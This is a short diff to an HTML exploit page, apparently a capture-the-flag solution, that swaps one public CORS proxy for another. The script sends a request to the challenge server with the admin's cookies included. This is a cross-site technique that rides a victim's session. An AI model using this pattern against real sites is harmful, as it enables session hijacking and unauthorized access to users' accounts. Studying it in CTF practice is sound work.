@@ -3,8 +3,8 @@
 <head>
     <title>Exploit</title>
     <script>
-        // Step 1: Fetch the vulnerable URL over HTTP (but via an HTTPS proxy)
-        fetch('https://thingproxy.freeboard.io/fetch/http://chal1.lagncra.sh:8426/?lang=en', {
+        // Step 1: Fetch the vulnerable URL with query params (now via a proxy)
+        fetch('https://cors-anywhere.herokuapp.com/http://chal1.lagncra.sh:8426/?lang=en', {
             credentials: 'include' // Include admin's cookies in the request
         })
         .then(response => response.text()) // Read response as text
